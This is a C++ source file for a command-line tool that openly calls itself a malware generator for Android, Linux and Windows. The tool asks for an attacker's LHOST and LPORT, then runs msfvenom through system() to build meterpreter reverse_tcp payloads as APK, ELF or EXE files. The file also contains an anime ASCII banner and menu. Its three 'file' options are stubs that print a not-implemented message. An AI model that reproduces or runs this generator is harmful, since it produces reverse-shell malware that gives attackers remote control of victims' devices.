// Librerias
#include <iostream>
#include <unistd.h>
#include <string>
#include <sstream>
#include "colors.h"

//Namespace
using namespace std;
using namespace Color;

// Validar que no de una entrada vacía o string
int obtenerOpcion() {
    string input;
    cout << paint_multi("\nSelect Op => ", RED, ITALIC);
    getline(cin, input); // Leer toda la línea

    if (input.empty()) {
        cout << paint_multi("Option cannot be empty\n", RED, ITALIC);
        return -1;
    }

    stringstream ss(input);
    int opcion;
    if (!(ss >> opcion)) {
        cout << paint_multi("Invalid input. Must be a number.\n", RED, ITALIC);
        return -1;
    }

    return opcion;
}

// Generadores de Malware para Android/Linux/Windows


// Generador de Malware para Android mediante MetaSploit
void android_meta(string lhost, string lport){
    // Genera el payload MsfVenom para Android
    // y lo guarda en un archivo APK
    string payload = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f apk -o android_shell.apk";
    // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
    system(payload.c_str());
}

// Genera el malware para Linux mediante MetaSploit
void linux_meta(string lhost, string lport, int version){
    // Genera el payload MsfVenom para Linux
    // y lo guarda en un archivo ELF
    // version 1: linux/x86/meterpreter/reverse_tcp
    // version 2: linux/x64/meterpreter/reverse_tcp
    string payload;
    if (version == 1){
        // Genera el payload para Linux x86
        // y lo guarda en un archivo ELF llamado linux_x86shell.elf
        payload = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o linux_x86shell.elf";
    }
    else if (version == 2){
        // Genera el payload para Linux x64
        // y lo guarda en un archivo ELF llamado linux_x64shell.elf
        payload = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o linux_x64shell.elf";
    }
    // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
    system(payload.c_str());
}

// Genera el malware para Windows mediante MetaSploit
void windows_meta(string lhost, string lport, int version){
    // Genera el payload MsfVenom para Windows
    // Version 1: windows/meterpreter/reverse_tcp
    // Version 2: windows/x64/meterpreter/reverse_tcp
    // Para arquitectura de 32 bits y 64 bits respectivamente
    if (version == 1){
        // Genera el payload para Windows x86
        // y lo guarda en un archivo EXE llamado windows_x86shell.exe
        string payload = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o windows_x86shell.exe";
        system(payload.c_str()); // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
    }

    else if (version == 2){
        // Genera el payload para Windows x64
        // y lo guarda en un archivo EXE llamado windows_x64shell.exe
        string payload = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o windows_x64shell.exe";
        system(payload.c_str()); // Ejecuta el comando en la terminal usando c_str() para manejo de cons char*
    }
}

// Estas funciones retornan strings de marcador de posición para Android, Linux y Windows.
// Actualmente, el código fuente específico para cada plataforma aún no está implementado.
// Al definir estas funciones ahora, facilitamos futuras implementaciones sin necesidad de cambiar el menú.
void android_origin(){
    cout << paint_multi("Android malware generator is not implemented yet.", RED, ITALIC) << endl;
}

void linux_origin(){
    cout << paint_multi("Linux malware generator is not implemented yet.", RED, ITALIC) << endl;
}

void windows_origin(){
    cout << paint_multi("Windows malware generator is not implemented yet.", RED, ITALIC) << endl;
}


// Banner del programa con ASCII art
// Muestra a mi encantadora Lain, mi persnaje favorito de anime
// y la version del programa
void start_banner(){
    system("clear");
    string banner = R"(
⠀⡄⢉⠲⢿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⣧⡽⠋⠀⣰⣶⣻⣶⣿⢾⣷
⢤⡈⠉⠲⢤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢀⡴⢏⡳⢮⡿⣽⣞⠻⡜
⠒⣭⠳⢶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡙⠮⣜⣯⡽⣳⢌⡓⠈
⡸⣰⢋⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣻⢿⣻⣿⡽⣗⠋⠄⠀
⠣⢇⢟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢟⡿⢣⣟⡻⠘⠀⠀⠀
⠱⡊⠤⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠨⠗⠋⣁⣤⠖⠊⢁⣀
⠀⠁⠂⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⣿⡂⠹⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠒⢋⣉⡤⣔⣮⣽⣾
⢢⠣⣌⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢰⣿⡅⠀⣿⣿⣿⣿⣿⠀⠸⢿⣹⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣻⣿⣿⣿⣿⣿⣿⣿
⢃⡉⠠⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⢹⠀⠀⠀⠀⣾⠿⡇⠀⣿⣿⣿⣿⡏⠀⠀⣞⣧⣻⠟⢿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣧⠱⣌⣳⣽⣻⣿⣿⣻
⠀⢒⡕⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⡇⠈⣇⠀⠀⠀⠈⡆⢳⠀⠇⡟⠋⠉⠀⠀⠀⠃⢙⣠⣤⣤⣼⣯⣚⣟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠌⠑⠌⢳⠛⡛⠏⠛⠉
⡘⢷⣌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢻⣀⣧⣤⣽⣦⣤⣄⠀⠰⡀⠃⠀⠀⠀⠀⠀⠀⡴⠟⠛⣉⣉⡉⠉⠈⠉⠉⠉⠋⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢈⠈⠈⠁⠛⠀⠀⠀⣒
⠉⢣⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠖⠛⠉⠉⠉⠀⠀⠐⠒⢢⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣠⣲⣾⣿⢿⣷⢶⡄⠀⠀⣽⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⠛⢁⣤⡶⠿⠛⠋
⠀⠀⠌⢽⣿⣿⣿⣿⣿⣿⣿⣿⡷⠀⠀⠀⣠⣶⣶⣿⣟⣿⣶⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢿⣿⣿⣿⣿⠀⣿⡀⠀⢻⣬⣙⡻⡿⣡⣾⣿⣿⡍⠈⣀⣤⣬⣤⣶⣲⣶⣿
⠀⢈⠐⡀⢻⣫⢿⣿⣿⣿⣿⠘⢧⠁⠀⣻⡏⠸⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⣉⣛⣋⣡⡴⠃⠀⠀⣿⣿⣿⠟⣠⡛⢿⣿⣿⣷⣲⣽⣿⣿⣷⣾⣷⣿⣿
⠀⠀⢀⠐⡀⢃⡈⣿⢿⣿⣿⣟⡆⠀⠀⠉⠿⣦⣈⣉⣉⠤⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⣡⣶⣿⣿⣾⣿⣿⣿⢿⡿⣿⣿⡿⠿⠛⣋⣡
⠠⠐⡀⢢⣶⣿⢧⠻⣯⣿⣯⡛⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⠐⠂⡁⠤⠔⢂⣉⣤⡴
⣀⠥⠌⣳⢯⣟⣮⣗⣾⣟⣿⣿⣦⣭⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⣈⠥⡔⡤⣍⠣⣝⢾⡹
⠀⠀⠀⠠⠈⠉⠈⠉⠉⠉⣨⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢞⣿⣝⣳⢎⢳⢻⡮⣕
⠀⠀⢀⠀⡀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⢠⠘⡼⣽⣛⡞⠦⣧⢻⣽
⠀⢈⠀⡀⡀⢤⠞⡉⢭⣹⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣍⣣⢾⣵⣯⣷⣽⣦⣑⣯⢿
⠀⠂⣴⣾⡟⣧⠊⡔⢢⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⣯⢹⣽⢻⣿⣿⣿⣿⣿⣿⣿⣿
⣶⣟⠳⣏⡿⣎⠳⣈⡜⣺⣿⠿⢿⣝⡿⣫⢟⣽⣿⣿⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠛⣿⠿⣟⢩⢾⣿⣿⣿⣿⣇⠾⣜⡧⣯⣟⣿⣿⣿⣿⣿⣿⣿⣿
⠋⢀⢱⣫⣟⢾⡹⢴⡸⣵⡏⣂⢾⡿⣽⣹⣟⣾⣿⡟⢠⡇⠀⣹⠂⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣣⢟⡿⣾⣿⣿⣿⣿⢌⠫⢝⡻⣵⢻⡟⣿⢿⣿⢿⡿⣿⠿
⠀⢢⠞⣴⢯⢯⣝⣦⢳⡝⡶⣭⣿⣽⣳⣟⡾⣽⡟⢀⡟⠀⢀⡿⠀⠀⠀⠁⠠⠤⠀⠀⠀⠤⠐⠀⠀⠀⠀⠀⠀⠀⢸⡗⠈⠭⣿⣿⣿⣿⡿⢌⠣⡀⡐⢈⠃⠚⠦⣉⠂⠣⠜⡄⢋
⣜⣷⢻⡜⣯⣾⡞⣥⣓⢾⡽⢎⡷⢯⡷⣯⢟⣽⠃⣸⠁⠀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹⣿⣿⣿⣿⢃⡮⡑⢰⢠⣂⡜⣦⡴⣱⣎⣴⣩⡜⣦
⣿⣯⢷⡻⣏⣷⣟⠶⣙⠮⡙⢪⠜⣯⢽⣯⣿⠃⠄⢃⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣾⣿⣿⣿⡇⠢⢡⡙⢦⡓⡼⣽⣾⣿⣿⣿⣿⣷⣿⣿
⣿⡹⢇⡳⡹⣞⠘⡈⢅⠢⢁⠂⡘⠤⣋⣶⣡⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠰⡁⢆⠘⣡⠻⣽⣳⣿⣿⣿⣿⢿⣿⣿⣿
⢣⠝⡢⢍⠱⢈⣂⣌⡤⠦⠶⠶⠞⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠛⠷⣭⣂⠌⢠⠓⡴⣻⣿⣿⣿⣿⣿⣿⣯⣿
⣇⢾⡱⠞⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠉⠛⠳⠿⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿
                        Version 1.0

)";
    cout<<paint_multi(banner, CYAN) << endl;
    sleep(2);
    system("clear");
}

// Menu
void menu(){
    // ASCII art para el banner
    string menu = R"(
                              (
                       (      )\ )      )          (    (
  (   (           (     )\ )  (()/(   ( /(     (    )\   )\
  )\  )\     (    )\   (()/(   /(_))  )\())   ))\  ((_) ((_)
 ((_)((_)    )\  ((_)   ((_)) (_))   ((_)\   /((_)  _    _
  \ \ / /   ((_)  (_)   _| |  / __|  | |(_) (_))   | |  | |
   \ V /   / _ \  | | / _` |  \__ \  | ' \  / -_)  | |  | |
    \_/    \___/  |_| \__,_|  |___/  |_||_| \___|  |_|  |_|
                  Creator -> 74lg0
                   Written in C++

      METASPLOIT             CREATED BY 74LG0
  _____________________    ______________________
 |                     |  |                      |
 |   [1] Android       |  |   [4] Android File   |
 |   [2] Linux         |  |   [5] Linux File     |
 |   [3] Windows       |  |   [6] Windows File   |
 |_____________________|  |______________________|

                    [0] Exit

    )";
    cout<<paint(menu, CYAN);
    // Creditos a esta validacion a GPT
    int opciones = obtenerOpcion();
    if (opciones == -1) {
        // Manejar error
        return;
    }

    // Si lo anterior no se cumple, ejecutar el switch
    switch (opciones){
        case 0:
            cout<<paint("[!] Saliendo del programa...", BRIGHT_RED)<<endl;
            // Esperar 1 segundo antes de salir
            sleep(1);
            exit(0);
            break;

        // Android Malware MetaSploit Generator
        case 1: {
            // Configuracion de variables
            string lport, lhost;
            
            // Configuracion del host:port
            cout<<paint_multi("LHOST= ", GREEN, ITALIC);
            cin>>lhost; // Pedir LHOST
            cout<<paint_multi("LPORT= ", GREEN, ITALIC);
            cin>>lport; // Pedir LPORT
            // Validar LHOST y LPORT
            if (lhost.empty() || lport.empty()) {
                cout << paint_multi("LHOST and LPORT cannot be empty", RED, ITALIC) << endl;
                break;
            }
            // Android Malware MetaSploit
            android_meta(lhost, lport);
            break;
        }

        case 2: {
            string lhost, lport;
            int linux_version;
            string linux_menu = R"(
        [1] [1] Linux x86 (32 bits)
        [2] Linux x64 (64 bits)
            )";
            cout << paint_multi(linux_menu, GREEN, ITALIC);
            cout << endl << paint_multi("Select Linux Version => ", GREEN, ITALIC);
            cin >> linux_version;
            // Validar la opción primero
            if (linux_version != 1 && linux_version != 2) {
                cout << paint_multi("Incorrect option", RED, ITALIC) << endl;
                break;
            }
            // Solo si es opción válida, pedimos LHOST y LPORT
            cout << paint_multi("LHOST= ", GREEN, ITALIC);
            cin >> lhost;
            cout << paint_multi("LPORT= ", GREEN, ITALIC);
            cin >> lport;
            // Validar LHOST y LPORT
            if (lhost.empty() || lport.empty()) {
                cout << paint_multi("LHOST and LPORT cannot be empty", RED, ITALIC) << endl;
                break;
            }

            // Linux Malware MetaSploit
            linux_meta(lhost, lport, linux_version);
            break;
            
        }

        case 3: {
            int win_version;
            string window = R"(
            [1] Windows x86 (32 bits)
            [2] Windows x64 (64 bits)
            )";
            // Mostrar el menú de versiones de Windows
            
            cout << paint_multi(window, GREEN, ITALIC);
            cout << endl << paint_multi("Select Win Version => ", GREEN, ITALIC);
            cin >> win_version;
            
            // Validar la opción primero
            if (win_version != 1 && win_version != 2) {
                cout << paint_multi("Incorrect option", RED, ITALIC) << endl;
                break;
            }
            // Configuracion del host:port
            // Solo si es opción válida, pedimos LHOST y LPORT
            string lhost, lport;
            cout << paint_multi("LHOST= ", GREEN, ITALIC);
            cin >> lhost;
            cout << paint_multi("LPORT= ", GREEN, ITALIC);
            cin >> lport;

            // Validar LHOST y LPORT
            if (lhost.empty() || lport.empty()) {
                cout << paint_multi("LHOST and LPORT cannot be empty", RED, ITALIC) << endl;
                break;
            }

            // Llamar función según la opción
            windows_meta(lhost, lport, win_version);
            break;
        }


        case 4:{
            // File Android Malware
            android_origin();
            break;
        }

        case 5:{
            // Linux Malware 
            linux_origin();
            break;
        }

        case 6:{
            // Windows Malware
            windows_origin();
            break;
        }

        default:
            cout<<paint("[!] Elige una opcion correcta…", BRIGHT_RED);
    }
}


// Main
int main(){
    start_banner();
    menu();

    // Return
    return 0;
}